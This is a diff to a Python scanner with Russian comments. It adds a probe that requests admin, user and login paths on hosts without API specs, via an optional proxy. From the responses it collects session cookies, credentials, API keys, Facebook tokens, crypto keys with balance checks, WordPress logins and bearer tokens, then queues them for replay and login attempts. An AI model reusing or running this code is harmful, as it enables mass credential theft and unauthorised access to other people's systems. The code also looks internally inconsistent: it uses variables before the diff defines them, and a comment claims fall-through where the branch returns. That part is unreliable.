@@ -579,6 +579,17 @@ def _fuzz_value_variants(val: str) -> list[str]:
     return out
 # id'шники в JSON-телах (для id-fuzz: подставляются в GET-шаблоны с {param})
 
+# Generic probe: хосты без спеки (is_alive, но no OpenAPI) - пробуем общие
+# admin/list/me пути. GET-only, ответы через полный classify+коллекторы
+GENERIC_PROBE_PATHS = (
+    "/admin", "/api/admin", "/admin/users", "/api/users", "/api/v1/users",
+    "/api/config", "/api/settings", "/api/dashboard", "/admin/dashboard",
+    "/api/auth/me", "/api/user/me", "/me",
+    "/login", "/api/login", "/admin/login", "/api/auth/login",
+)
+# из них POST-формы - кандидат на фазу 4 (login-проверка с cred'ами)
+LOGIN_PROBE_PATHS = frozenset({"/login", "/api/login", "/admin/login", "/api/auth/login"})
+
 
 # --- replay-входы (фаза 3): cookie-сессии, креды (пары + Basic), api-keys ---
 REPLAY_SESSION_RE = re.compile(
@@ -996,6 +1007,102 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
 
             if spec is None:
                 result.has_openapi = False
+                # --- Generic probe: без спеки хост почти невидим - пробуем
+                # общие admin/list/me пути. Ответы проходят через тот же
+                # classify + коллекторы (sessions/creds/apikeys/facebook/
+                # crypto/wp/secrets) и попадают в endpoints_data как
+                # VULNERABLE. Дальше - те же фазы 3/4 (replay/login)
+                for probe_path in GENERIC_PROBE_PATHS:
+                    if time.monotonic() >= deadline:
+                        break
+                    try:
+                        async with session.get(
+                            base_url.rstrip("/") + probe_path,
+                            headers={"Accept": "application/json"},
+                            allow_redirects=False,
+                            timeout=aiohttp.ClientTimeout(total=cfg.check_timeout),
+                            proxy=proxy,
+                        ) as rresp:
+                            pbody = await rresp.text()
+                            ppatterns, psev = classify_response(pbody[:100_000])
+                            # защищённый GET - в очередь replay (401/403)
+                            if rresp.status in (401, 403):
+                                if len(protected_gets) < cfg.token_replay_endpoints_max:
+                                    protected_gets.append((probe_path, probe_path))
+                            if not ppatterns:
+                                continue
+                            # фиды: сессии/креды/api-keys/facebook/crypto/wp
+                            if cfg.session_replay:
+                                _replay_sessions_from_text(
+                                    pbody[:100_000], replay_sessions,
+                                    replay_sessions_seen, cfg.session_replay_max)
+                            if cfg.cred_replay:
+                                _replay_creds_from_text(
+                                    pbody[:100_000], replay_creds,
+                                    replay_creds_seen, cfg.cred_replay_max)
+                            if cfg.apikey_replay:
+                                _replay_apikeys_from_text(
+                                    pbody[:100_000], replay_apikeys,
+                                    replay_apikeys_seen, cfg.apikey_replay_max)
+                            if cfg.facebook_checks:
+                                for tok in extract_facebook_tokens(pbody[:100_000]):
+                                    if tok not in facebook_tokens_seen \
+                                            and len(facebook_tokens_found) < cfg.facebook_verify_max:
+                                        facebook_tokens_seen.add(tok)
+                                        facebook_tokens_found.append(tok)
+                            if cfg.key_balance_checks:
+                                for e in extract_crypto_keys(pbody[:100_000]):
+                                    sig = (e["kind"], e["value"])
+                                    if sig not in crypto_keys_seen \
+                                            and len(crypto_keys_found) < cfg.key_balance_max:
+                                        crypto_keys_seen.add(sig)
+                                        crypto_keys_found.append(e)
+                            if cfg.secret_checks:
+                                secrets_found.update(extract_secrets(pbody[:100_000]))
+                            if cfg.wp_checks:
+                                if '"wp_user' in pbody or '"wp_pass' in pbody:
+                                    wp_panel_seen = True
+                                wp_pairs_found.extend(
+                                    extract_wp_creds(pbody[:100_000], fallback_url=base_url))
+                            # login-эндпоинт (200 + форма) - в очередь фазы 4
+                            if cfg.login_checks and probe_path in LOGIN_PROBE_PATHS \
+                                    and rresp.status == 200 and probe_path not in login_paths:
+                                login_paths.append(probe_path)
+                            probe_ep: dict[str, Any] = {
+                                "path": probe_path + "#probe",
+                                "method": "GET",
+                                "expects_auth": False,
+                                "status_code": rresp.status,
+                                "verdict": "VULNERABLE",
+                                "patterns": ppatterns,
+                                "response": None,
+                            }
+                            try:
+                                probe_ep["response"] = json.loads(pbody)
+                            except (json.JSONDecodeError, ValueError):
+                                probe_ep["response"] = pbody[:100_000]
+                            endpoints_data.append(probe_ep)
+                            result.total_endpoints += 1
+                            result.vulnerable_count += 1
+                            all_patterns.extend(ppatterns)
+                            if severity_order.get(psev, 0) > severity_order.get(max_severity, 0):
+                                max_severity = psev
+                            if severity_order.get(max_severity, 0) < 3:
+                                max_severity = "CRITICAL"
+                            # bearer-токен из probe-тела - в общий пул фазы 3
+                            if cfg.token_replay:
+                                for m in TOKEN_RE_RE.finditer(pbody[:100_000]):
+                                    tok = m.group(1)
+                                    if is_junk_token_value(tok) or tok in auth_tokens_seen:
+                                        continue
+                                    auth_tokens_seen.add(tok)
+                                    if len(auth_tokens_found) < cfg.token_replay_max:
+                                        auth_tokens_found.append(tok)
+                                        auth_token_sources.setdefault(tok, probe_path)
+                    except (aiohttp.ClientError, asyncio.TimeoutError):
+                        continue
+                # при живом сервере после probe - проваливаемся в фазы 3/4:
+                # защищённые пути и креды из probe попадают в общие списки
                 return result
 
             # 3. Парсим спецификацию
@@ -1037,6 +1144,7 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
             integration_panel_seen: bool = False
             # token replay: access_token'ы из тел + protected GET (401/403)
             auth_tokens_found: list[str] = []
+            auth_tokens_seen: set[str] = set()
             auth_token_sources: dict[str, str] = {}
             protected_gets: list[tuple[str, str]] = []
             token_replay_checks: list[dict[str, Any]] = []
